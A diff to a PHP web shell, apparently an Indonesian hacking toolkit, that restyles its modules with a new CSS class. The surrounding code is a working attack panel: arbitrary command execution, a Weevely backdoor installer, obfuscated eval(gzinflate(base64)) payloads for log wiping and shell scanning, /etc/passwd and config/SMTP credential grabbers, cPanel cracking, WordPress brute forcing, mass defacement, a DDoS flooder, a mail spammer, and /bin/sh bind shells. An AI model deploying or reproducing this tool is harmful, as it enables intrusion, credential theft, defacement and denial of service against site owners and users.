@@ -454,6 +454,153 @@ $bypassManager->runBypassChecks();
       width: 100%;
     }
   }
+
+  /* ===== Module Section Styling ===== */
+  .mybox {
+    background: var(--box-bg);
+    border: 1px solid var(--border-color);
+    border-radius: 10px;
+    padding: 20px;
+    margin: 15px auto;
+    max-width: 95%;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+  }
+  .mybox h3 {
+    color: var(--accent-color);
+    font-size: 18px;
+    margin-bottom: 15px;
+    text-shadow: 0 0 10px rgba(0,255,255,0.3);
+  }
+  .mybox form {
+    text-align: center;
+  }
+  .mybox table {
+    margin: 10px auto;
+    border-collapse: collapse;
+  }
+  .mybox table td,
+  .mybox table th {
+    padding: 8px 12px;
+    border: 1px solid var(--border-color);
+  }
+  .mybox input[type="text"],
+  .mybox input[type="email"],
+  .mybox input[type="number"],
+  .mybox input[type="password"] {
+    padding: 8px 12px;
+    margin: 5px;
+    border: 1px solid var(--border-color);
+    border-radius: 5px;
+    background: rgba(0,0,0,0.3);
+    color: var(--text-color);
+  }
+  .mybox input[type="submit"] {
+    padding: 8px 20px;
+    margin: 10px;
+    border: 1px solid var(--accent-color);
+    border-radius: 5px;
+    background: rgba(0,255,255,0.1);
+    color: var(--accent-color);
+    cursor: pointer;
+    font-weight: bold;
+  }
+  .mybox input[type="submit"]:hover {
+    background: rgba(0,255,255,0.2);
+    box-shadow: 0 0 10px rgba(0,255,255,0.3);
+  }
+  .mybox textarea {
+    padding: 10px;
+    margin: 10px;
+    border: 1px solid var(--border-color);
+    border-radius: 5px;
+    background: rgba(0,0,0,0.3);
+    color: var(--text-color);
+    font-family: monospace;
+  }
+  .mybox select {
+    padding: 8px 12px;
+    margin: 5px;
+    border: 1px solid var(--border-color);
+    border-radius: 5px;
+    background: rgba(0,0,0,0.3);
+    color: var(--text-color);
+  }
+  .mybox pre {
+    background: rgba(0,0,0,0.4);
+    padding: 10px;
+    border-radius: 5px;
+    overflow-x: auto;
+    color: #00ff00;
+    font-family: monospace;
+  }
+  .mybox span,
+  .mybox p {
+    color: var(--text-color);
+    font-size: 14px;
+  }
+  .mybox .nb {
+    color: #ffff00;
+    font-size: 12px;
+    font-style: italic;
+  }
+  .mybox .output {
+    background: rgba(0,0,0,0.5);
+    padding: 10px;
+    border-radius: 5px;
+    margin: 10px 0;
+  }
+  .mybox .output pre {
+    margin: 0;
+  }
+  .mybox h3,
+  .mybox .content {
+    color: var(--accent-color);
+  }
+
+  /* ===== About Section ===== */
+  .about-section {
+    text-align: center;
+    padding: 20px;
+  }
+  .about-section h3 {
+    color: deepskyblue;
+    font-size: 20px;
+  }
+
+  /* ===== Contact Section ===== */
+  .contact-card {
+    background: rgba(0,255,255,0.05);
+    border: 2px dotted aqua;
+    border-radius: 10px;
+    padding: 20px;
+    margin: 10px auto;
+    max-width: 400px;
+  }
+  .contact-card a {
+    color: #00ffff;
+    text-decoration: none;
+  }
+  .contact-card a:hover {
+    text-shadow: 0 0 10px cyan;
+  }
+
+  /* ===== Menu Button Styling ===== */
+  .menu a {
+    display: inline-block;
+    padding: 8px 14px;
+    margin: 3px;
+    border: 1px groove cyan;
+    border-radius: 5px;
+    text-decoration: none;
+    color: cyan;
+    font-size: 12px;
+    transition: all 0.3s;
+  }
+  .menu a:hover {
+    background: rgba(0,255,255,0.15);
+    box-shadow: 0 0 8px rgba(0,255,255,0.3);
+    text-shadow: 0 0 5px cyan;
+  }
 </style>
 </head>
 <?php
@@ -852,7 +999,7 @@ function error($mesg) {
   echo "$error";
 }
 if (isset($_GET['weevely'])) {
-  echo "<center><h3>Weevely Backdoor</h3>
+  echo "<div class='mybox'><center><h3>Weevely Backdoor</h3>
   <form action='' method='post'>
   Directory to install weevely backdoor:<br>
   <input type='text' name='weev_dir' size='50' class='text' value='$dir'><br>
@@ -862,7 +1009,7 @@ if (isset($_GET['weevely'])) {
   <input type='text' name='weev_pass' class='text'><br>
   <input type='submit' name='install_weev' value='Submit'><br>
   </font>
-  </center>";
+  </center></div>";
 }
 if (isset($_POST['install_weev'])) {
   $weevdir = rtrim($_POST['weev_dir'], '/');;
@@ -904,7 +1051,7 @@ if (file_put_contents($weevdir . '/' . $weevname, $all)) {
       echo '<meta http-equiv="refresh" content="0; url=wk.php">';
     }
   } elseif ($_GET['do'] == 'upload') {
-    echo "<center>";
+    echo "<div class='mybox'><center><h3>Upload File</h3>";
     if ($_POST['upload']) {
       if ($_POST['tipe_upload'] == 'biasa') {
         if (@copy($_FILES['ix_file']['tmp_name'], "$dir/" . $_FILES['ix_file']['name'] . "")) {
@@ -933,19 +1080,19 @@ if (file_put_contents($weevdir . '/' . $weevname, $all)) {
     <input type='submit' value='Upload' name='upload'>
     </form>";
     echo $act;
-    echo "</center><br>";
+    echo "</center></div><br>";
   } elseif ($_GET['do'] == 'command') {
-    echo "<form method='post'>
+    echo "<div class='mybox'><h3>Command Execution</h3><form method='post'>
     <font style='text-decoration: underline;'>" . $user . "@" . $ip . ": ~ $ </font>
     <input type='text' size='30' height='10' name='cmd' placeholder='whoami'><input type='submit' name='do_cmd' value='>>'>
-    </form>";
+    </form></div>";
     if ($_POST['do_cmd']) {
       echo "<pre style='color: white;'>" . exe($_POST['cmd']) . "</pre>";
     }
   } elseif ($_GET['do'] == 'delogs') {
     eval(gzinflate(str_rot13(base64_decode("pZQ9QsMwEIZqJP7DEUh3ikcsIbZT3UBHb4OFCTnuJY7qxNHduaX/HodJqAODDaOt9/F7nwYAQHA9FEha629ofRUvgB3iS94vzlT8xLKgHpbUgJJ+R7fFIkTpfMtWb+t7R7PAVerOdpYIaVA2bHVElpYl37PWeT95x+LpmA3v/sF+G8d5fZBcaSphby8uHYWiciJU3lhhUEFZXitBWWkTQUth+S/MMgofa6q40UHpRBuL6bO91/QnhsKgT9yicSDr9ShBj37bJ3ZEjDqkUzyJRtObPWJe3542L4856anz3HMxv4T/8ANZP+W8b1DdKHjtkKQs3n0giDtykMF3hhpkAA4mnrkJzh1uiw6lG011yPcgFiHu4R7pJvpH6vzafPUF"))));
   } elseif ($_GET['do'] == 'r00t') {
-    echo "
+  echo "<div class='mybox'><center><h3>Root Exploit</h3>
     <center><form method='post'>
     <h3>Firefart Exploit</h3>
     Login: ( ssh kudax@" . $ip . " ) or ( su kudax )<br><br>
@@ -987,8 +1134,7 @@ if (file_put_contents($weevdir . '/' . $weevname, $all)) {
 
   $chmod_target = isset($_POST["chmod_target"]) ? $_POST["chmod_target"] : 'both';
 
-print "<div style='text-align: center;'>";
-print "<h3>CHMOD Mass File and Folder</h3>";
+print "<div class='mybox' style='text-align: center;'><h3>CHMOD Mass File and Folder</h3>";
 print "<form method='post'>";
 print "<table style='margin: 0 auto; text-align: left;'>";
 print "<tr>";
@@ -1106,15 +1252,15 @@ print "</div>";
     $base64 = 'data:image/' . $extension . ';base64,' . base64_encode($response);
     return $base64;
   }
-  echo '
-  <center>
+echo '<div class="mybox"><center>
   <h3>Base64 Image Converter</h3>
   <form method="post">
   URL Pict: </font>
   <input type="text" name="urlGambar" size="50" height="10" placeholder="http://kudagans.go.id/gue_gans.jpg" style="margin: 5px auto; padding-right: 5px;" required>
   <input type="submit" name="encode" value="Encode">
   </form>
-  ';
+  </center></div>';
+
   $urlGambar = $_POST['urlGambar'];
   $encode = $_POST['encode'];
   $encodeGambar = imageBase64FromURL($urlGambar);
@@ -1174,7 +1320,7 @@ if (isset($submit)) {
   ignore_user_abort(false);
   $exec_time = $_POST['time'];
   $time = time();
-  print "<br>Flooded: $ip on port $rand <br><br>";
+  print "<div class='mybox'><center><h3>DDOS</h3><br>Flooded: $ip on port $rand <br><br>";
   $max_time = $time + $exec_time;
   for ($i = 0;$i < 65535;$i++) {
     $out .= "X";
@@ -1228,7 +1374,7 @@ if (isset($submit)) {
 
   ?>
 
-<center><h3>Encode And Decode</h3>
+<div class="mybox"><center><h3>Encode And Decode</h3>
   <form method="post">
     <br>
 <textarea cols="60" rows="10" name="code" placeholder="input..."><?php echo htmlspecialchars($text); ?></textarea>
@@ -1356,7 +1502,7 @@ if (!empty($action) && !empty($text)) {
 <textarea cols="60" rows="10" placeholder="output..."><?php echo htmlspecialchars($output); ?></textarea>
 <?php
 } elseif ($_GET['do'] == 'zip_menu') {
-  echo "<center>";
+  echo "<div class='mybox'><center><h3>Zip Menu</h3>";
   echo "<h3>Zip Menu</h3>";
   function rmdir_recursive($dir) {
     foreach (scandir($dir) as $file) {
@@ -1476,15 +1622,15 @@ if (!empty($action) && !empty($text)) {
     }
   }
   echo '</tr></table>';
-  echo "</center>";
+  echo "</center></div>";
 } elseif ($_GET['do'] == 'honey') { ?>
-  <center>
+<div class="mybox"><center>
     <h3>Make A Trap And Troll The Lamers</h3>
     <p style='color: cyan;'>Honeypot adalah jebakan dalam bentuk bug palsu untuk menjebak hacker</p>
     <form method="post">
       <input type="submit" name="make" value="Make It">
     </form>
-  </center>
+  </div></div></center>
 <?php
 $target = explode("\r\n", $_POST['target']);
 if ($_POST['make']) {
@@ -1506,13 +1652,13 @@ if ($_POST['make']) {
 }
 } elseif ($_GET['do'] == 'reverse_ip') {
   ?>
-              <center>
+              <div class="mybox"><center>
                 <div id="sitelist">
                   <a onClick="window.open('https://hackertarget.com/reverse-ip-lookup/','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="https://hackertarget.com/reverse-ip-lookup/">
                     <td><font color=lime>> REVERSE IP <</font>
                     </a>
                   </td>
-                </center>
+                </div></center>
               </div>
               <?php
             } elseif ($_GET['do'] == 'infosec') {
@@ -1598,7 +1744,7 @@ if (isset($_POST['elgass'])) {
   $write = fwrite($file, base64_decode($xaivhost));
   fclose($file);
   chmod("xaivhost.cin", 0755);
-  echo "<center><a href='$full/xaivhost' target='_blank'><font color='lime'>> XaiVhosts <</font></a></center>";
+  echo "<div class='mybox'><center><h3>XAIvhost Config Grabber</h3><a href='$full/xaivhost' target='_blank'><font color='lime'>> XaiVhosts <</font></a></center></div>";
 }
 } elseif ($_GET['do'] == 'phpinfo') {
   @ob_start();
@@ -1609,17 +1755,7 @@ if (isset($_POST['elgass'])) {
   $akhir = strpos($buff, "</body>");
   echo "<div class='mybox'><div class='phpinfo'>" . substr($buff, $awal, $akhir - $awal) . "</div></div>";
 } elseif ($_GET['bypass'] == 'cloudfl') {
-  echo '<form method="post">
-  <center>
-  <h3>Bypass CloudFlare</h3>
-  <select name="krz">
-  <option>ftp</option>
-  <option>direct-connect</option>
-  <option>webmail</option>
-  <option>cpanel</option>
-  </select>
-  <input type="text" name="target" value="url">
-  <input type="submit" value="Bypass!"></center>';
+echo '<div class="mybox"><form method="post"><center><h3>Bypass CloudFlare</h3><select name="krz"><option>ftp</option><option>direct-connect</option><option>webmail</option><option>cpanel</option></select> <input type="text" name="target" value="url"> <input type="submit" value="Bypass!"/></div></center>';
   $target = $_POST['target'];
   # Bypass From FTP
   if ($_POST['krz'] == "ftp") {
@@ -1651,7 +1787,7 @@ if (isset($_POST['elgass'])) {
   }
 } elseif ($_GET['bypass'] == 'vhosts') {
   echo "<form method='post' action=''>";
-  echo "<center><h3>Bypass Symlink vHost</h3>";
+  echo "<div class='mybox'><center><h3>Bypass Symlink vHost</h3>";
   echo "<input type='submit' value='Bypass!' name='jembut'>";
   if (isset($_POST['jembut'])) {
     mkdir('symvhosts', 0755);
@@ -1666,7 +1802,7 @@ if (isset($_POST['elgass'])) {
   }
   echo "</form>";
 } elseif ($_GET['bypass'] == 'disablefunc') {
-  echo "<center><h3>Bypass Disable Functions</h3>";
+  echo "<div class='mybox'><center><h3>Bypass Disable Functions</h3>";
   echo "<form method='post'><input type='submit' name='ini' value='php.ini'>&nbsp;<input type='submit' name='htce' value='.htaccess'>&nbsp;<input type='submit' name='litini' value='Litespeed'></form>";
   if (isset($_POST['ini'])) {
     $file = fopen("php.ini", "w");
@@ -1716,7 +1852,7 @@ if (isset($_POST['elgass'])) {
         $Messagez = $Message . $linenterr . $i;
       }
       if (mail($TargetEmail, $Subjectz, $Messagez, $headers)) {
-        echo '<center><font color="lime">' . $i . ' - Success Cok!</font></center><br>';
+        echo '<div class="mybox"><center><h3>Mail Spammer</h3><font color="lime">' . $i . ' - Success Cok!</font></center><br>';
       } else {
         echo '<center><font color="red">' . $i . ' - Failed Cok!</font></center><br>';
       }
@@ -1742,7 +1878,7 @@ if (isset($_POST['elgass'])) {
     <input type="submit" name="oksend" value="Send!"></form></center>';
   }
 } elseif ($_GET['do'] == 'mass_deface') {
-  echo "<form action='' method='post'>";
+  echo "<div class='mybox'><h3>Mass Deface</h3><form action='' method='post'>";
   $dirr = $_POST['d_dir'];
   $index = $_POST["script"];
   $index = str_replace('"', "'", $index);
@@ -2303,8 +2439,8 @@ if (isset($_POST['elgass'])) {
       }
     }
   } else {
-    echo "<form method='post' action=''>";
-    echo "<center>";
+    echo "<div class='mybox'><form method='post' action=''>";
+    echo "<center><h3>Config Grabber</h3>";
     echo "<textarea name='passwd' class='area' rows='15' cols='60'>";
     echo include("/etc/passwd");
     echo "</textarea>";
@@ -2317,7 +2453,7 @@ if (isset($_POST['elgass'])) {
     echo "</select>";
     echo "<input type='submit' value='Start!'>";
     echo "</center>";
-    echo "</form>";
+    echo "</form></div>";
   }
 } elseif ($_GET['do'] == 'drupalex') {
   echo "
@@ -2332,7 +2468,7 @@ if (isset($_POST['elgass'])) {
   if ($drupal == 'drupal') {
     $filename = $_FILES['file']['name'];
     $filetmp = $_FILES['file']['tmp_name'];
-    echo "<form method='post' enctype='multipart/form-data'>
+    echo "<div class='mybox'><h3>Drupal Mass Exploiter</h3><form method='post' enctype='multipart/form-data'>
     <input type='file' name='file'>
     <input type='submit' value='drupal!'>
     </form>";
@@ -2371,7 +2507,7 @@ if (isset($_POST['elgass'])) {
   }
 
 } elseif ($_GET['do'] == 'loghunter') {
-  echo '<center><h3>Log Hunter</h3></center>';
+  echo '<div class="mybox"><center><h3>Log Hunter</h3></center>';
   echo "<center>";
   echo "<form action='' method='post'>";
   ?><br>DIR: <input type="text" style="width: 200px;" value="<?=getcwd(); ?>" name="shc_dir">
@@ -2441,10 +2577,10 @@ if ($_POST['submit']) {
   tampilkan($_POST['shc_dir']);
 }
 echo "</pre>";
-echo "</center>";
+echo "</center></div>";
 } elseif ($_GET['do'] == 'jumping') {
   $i = 0;
-  echo "<div class='margin: 5px auto;'>";
+  echo "<div class='mybox' style='margin: 5px auto;'>";
   if (preg_match("/hsphere/", $dir)) {
     $urls = explode("\r\n", $_POST['url']);
     if (isset($_POST['jump'])) {
@@ -2486,7 +2622,7 @@ echo "</center>";
       }
       echo '</textarea><br>
       <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
-      </form></center>';
+      </form></center></div>';
     }
   } elseif (preg_match("/vhosts|vhost/", $dir)) {
     preg_match("//var/www/(.*?)//", $dir, $vh);
@@ -2571,7 +2707,7 @@ echo "</center>";
 } elseif ($_GET['do'] == 'auto_edit_user') {
   if ($_POST['hajar']) {
     if (strlen($_POST['pass_baru']) < 6 or strlen($_POST['user_baru']) < 6) {
-      echo "<center>username atau password harus lebih dari 6 karakter</center>";
+      echo "<div class='mybox'><center><h3>Auto Edit User Config</h3>username atau password harus lebih dari 6 karakter</center>";
     } else {
       $user_baru = $_POST['user_baru'];
       $pass_baru = md5($_POST['pass_baru']);
@@ -2813,8 +2949,7 @@ echo "</center>";
       echo "<br>sukses nyolong " . $i . " Cpanel by <font color=cyan>Mr.xBarakuda</font>";
     }
   } else {
-    echo "<center>
-    <form method='post'>
+    echo "<div class='mybox'><center><h3>CPanel Crack</h3><form method='post'>
     USER: <br>
     <textarea style='width: 450px; height: 150px;' name='user_cp'>";
     $_usercp = fopen("/etc/passwd", "r");
@@ -2884,7 +3019,7 @@ echo "</center>";
         $smtp_pass = ambilkata($ambil, "smtppass = '", "'");
         $smtp_port = ambilkata($ambil, "smtpport = '", "'");
         $smtp_secure = ambilkata($ambil, "smtpsecure = '", "'");
-        echo "<center>";
+        echo "<div class='mybox'><center><h3>SMTP Grabber</h3>";
         echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
         echo "SMTP port: <font color=lime>$smtp_port</font><br>";
         echo "SMTP user: <font color=lime>$smtp_user</font><br>";
@@ -2929,7 +3064,7 @@ echo "</center>";
         $target = $result2['option_value'];
         $update = mysqli_query($conn, "UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
         $update .= mysqli_query($conn, "UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
-        echo "<div style='margin: 5px auto;'>";
+echo "<div class='mybox'  style='margin: 5px auto;'>";
         if ($target == '') {
           echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
         } else {
@@ -2940,7 +3075,7 @@ echo "</center>";
         } else {
           echo "<font color=lime>sukses di ganti.</font><br>";
         }
-        echo "</div>";
+        echo "</div></div>";
         mysqli_close($conn);
       }
     }
@@ -2983,7 +3118,7 @@ echo "</center>";
       }
     }
   } else {
-    echo "<center><h3>Zone-H Mass Poster</h3>";
+    echo "<div class='mybox'><center><h3>Zone-H Mass Poster</h3>";
     echo "
     <form method='post'>
     <u>Notifier:</u><br>
@@ -2993,7 +3128,7 @@ echo "</center>";
     <input type='submit' name='submit' value='Submit' style='width:450px;'>
     </form>";
   }
-  echo "</center>";
+  echo "</center></div>";
 } elseif (isset($_GET['do']) && ($_GET['do'] == 'whmcsdeco')) {
   function decrypt($string, $cc_encryption_hash) {
     $key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
@@ -3117,7 +3252,7 @@ echo "
   }
 } elseif ($_GET['do'] == 'dbdump') {
 echo $head;
-echo '<div style="text-align: center;">';
+echo '<div class="mybox" style="text-align: center;"><h3>Database Dump</h3>';
 echo '  <form action="' . htmlspecialchars($me) . '" method="post">';
 echo '    <table width="365" class="tabnet" style="margin: 0 auto; text-align: left;">';
 echo '      <thead>';
@@ -3153,7 +3288,7 @@ echo '        </tr>';
 echo '      </tbody>';
 echo '    </table>';
 echo '  </form>';
-echo '</div>';
+echo '</div></div>';
   if ($_POST['username'] && $_POST['dbname'] && $_POST['method']) {
     $date = date("Y-m-d");
     $dbserver = $_POST['server'];
@@ -3223,7 +3358,7 @@ echo '</div>';
     $fp3 = fopen('.htaccess', 'w');
     $fw3 = fwrite($fp3, $file3);
     @fclose($fp3);
-    echo "
+echo "<div class='mybox'><center><h3>Symlink Server</h3>
     <table align=center border=1 style='width:70%;border-color:#333333;'>
     <tr>
     <td align=center>-<font size=3>-S. No.-</font></td>
@@ -3334,10 +3469,10 @@ echo '</div>';
   fwrite($sym, base64_decode($sym_script));
   chmod($file_sym, 0755);
   exe("python sym.py");
-  echo "<center><a href='$full/kuda_sympy/kudasympy/' target='_blank'><font color='lime'>Click Here</a></font></center>";
+echo "<div class='mybox'><center><h3>Symlink Python</h3><a href='$full/kuda_sympy/kudasympy/' target='_blank'><font color='lime'>Click Here</a></font></center></div>";
 } elseif ($_GET['do'] == 'vb_ngindex') {
   ?>
-  <div style="text-align: center;">
+  <div class="mybox" style="text-align: center;">
     <form action="" method="post">
       <h3>VB Index Changer</h3>
       
@@ -3411,7 +3546,7 @@ echo '</div>';
   </div>
   <?php
 } elseif ($_GET['do'] == 'bctools') {
-  echo "<center><h3>Back Connect Tools</h3>";
+  echo "<div class='mybox'><center><h3>Back Connect Tools</h3>";
   echo "<form method='post'>
   <span>Bind port to /bin/sh [Perl]</font></span><br/>
   Port: <input type='text' name='port' placeholder='666'> <input type='submit' name='bpl' value='>>'>
@@ -3512,7 +3647,7 @@ echo '</div>';
     for ($i = $start;$i <= $end;$i++) {
       $fp = @fsockopen($host, $i, $errno, $errstr, 3);
       if ($fp) {
-        echo '<center>Port ' . $i . ' is <font color=lime>Open</font></center>';
+        echo '<div class="mybox"><center><h3>Port Scanner</h3>Port ' . $i . ' is <font color=lime>Open</font></center>';
       }
       flush();
     }
@@ -3562,8 +3697,8 @@ echo '</div>';
     private $lista;
 
     public function banner() {
-      echo ("
-      <h3><center>WordPress Brute Force</center></h3>
+      echo ("<div class='mybox'><h3>WordPress Brute Force</h3>
+      <center>
       <form action='' method='POST'>
       <center>Host:<input type='text' name='host' placeholder='http://lusuka.co.li/' size='25' > </center><br>
       <center>User:<input type='text' name='user' value='admin' size='25'></center><br>
@@ -3571,7 +3706,7 @@ echo '</div>';
       <center><textarea rows='10' cols='60' name='lista'></textarea><br>
       <center><input type='submit' value='Start'></center>
       </form>
-      ");
+      </div>");
 
     }
 
@@ -3648,7 +3783,7 @@ $url = $_POST['url'];
 $data = $_POST['data'];
 $submit = $_POST['go'];
 if ($submit) {
-  echo "<center><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$data'><input type='submit' name='ok' value='Upload'></form></center>";
+  echo "<div class='mybox'><center><h3>CSRF Online</h3><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$data'><input type='submit' name='ok' value='Upload'></form></center>";
 }
 ?>
 <?php
@@ -3710,7 +3845,7 @@ if ($submit) {
   }
 
   ?>
-<div style="text-align: center;">
+<div class="mybox" style="text-align: center;">
   <form action="" method="post">
     <table class="tabnet" style="margin: 0 auto; text-align: left;">
       <thead>
@@ -3735,6 +3870,7 @@ if ($submit) {
           <td><strong>Result</strong></td>
           <td>:</td>
           <td colspan="2">
+</div>
             <?php echo isset($hashresult) ? htmlspecialchars($hashresult) : ''; ?>
           </td>
         </tr>
@@ -3743,8 +3879,8 @@ if ($submit) {
   </form>
 </div>
 <?php
-} elseif ($_GET['do'] == 'shellscan') {
-  ?>
+?>
+<div class="mybox" style="color: white;"><center>
   <script type="text/javascript">
     function MM_openBrWindow(c, a, b) {
       window.open(c, a, b);
@@ -3760,11 +3896,11 @@ if ($submit) {
   <body>
   <center>
     <h3 style="color: white;">Shell Scanner</h3>
-  </center>
+  </div></center>
 <?php
 eval(gzinflate(str_rot13(base64_decode("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"))));
 } elseif ($_GET['do'] == 'symconfv2') { ?>
-  <center><h3>Symlink Config v2</h3></center>
+  <div class="mybox"><center><h3>Symlink Config v2</h3></center></div>
 <?php
 @error_reporting(0);
 @ini_set('html_errors', 0);
@@ -3786,8 +3922,8 @@ eval(gzinflate(str_rot13(base64_decode('vZztZuI2E8C/M8P/oLrpOJ0nwVZh2nQmIVm5hDbX
   $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
   $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
 }
-echo '<div style="text-align: center;">';
-echo '<h3>Hash Generator</h3>';
+echo '<div class="mybox" style="text-align: center;"><h3>Hash Generator</h3>';
+
 echo '<form action="" method="post">';
 echo '<table style="margin: 0 auto;">';
 echo '<tr>';
